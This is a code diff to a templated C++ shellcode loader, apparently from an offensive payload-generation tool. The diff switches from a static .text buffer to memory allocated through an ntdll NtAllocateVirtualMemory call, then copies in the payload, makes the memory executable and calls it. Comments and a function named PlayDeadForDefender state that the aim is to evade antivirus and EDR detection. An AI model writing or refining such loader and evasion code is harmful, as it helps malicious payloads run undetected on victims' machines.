@@ -10,7 +10,10 @@
 auto tmpPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
 
 // A storage for final decrypted payload. It is specifically stored in .text section as it seems to make execution less obvious to AV/EDR when it's being executed from .text section.
-char __attribute__((section(".text"))) finalPayload[<%= payload_length %>];
+//extern "C" {
+//    __attribute__((used, section(".text"), aligned(16)))
+//    unsigned char finalPayload[<%= payload_length %>] = { 0x0 };  // one byte initializes; rest zero-filled by compiler
+//}
 
 int PlayDeadForDefender()
 {
@@ -46,6 +49,9 @@ int main() {
 
     DWORD dwOldProtect;
     unsigned long scsize;
+    NTSTATUS STATUS = 0;
+    PVOID pfinalPayload;
+    SIZE_T scsize_t = <%= payload_length %>;
 
     scsize = <%= payload_length %>;
     
@@ -54,19 +60,25 @@ int main() {
       return 1;
     }
 
-    if(!VirtualProtect(finalPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
+    STATUS = CALL_EXPORT("ntdll.dll", "NtAllocateVirtualMemory", int(*)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG), (HANDLE)-1, &pfinalPayload, 0, &scsize_t, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (STATUS != 0) {
+      return 1;
+    }
+
+    if(!VirtualProtect(pfinalPayload, scsize, PAGE_READWRITE, &dwOldProtect))
     {
       return 1;
     }
 
-    memcpy(finalPayload, tmpPayload, scsize);
+    memcpy(pfinalPayload, tmpPayload, scsize);
 
-    if(!VirtualProtect(finalPayload, scsize, PAGE_EXECUTE_READ, &dwOldProtect))
+    if(!VirtualProtect(pfinalPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
     {
       return 1;
     }
     
-    char * payload_fnc = (char*)finalPayload;
+    char * payload_fnc = (char*)pfinalPayload;
 	
     (*(void (*)()) payload_fnc)();
 
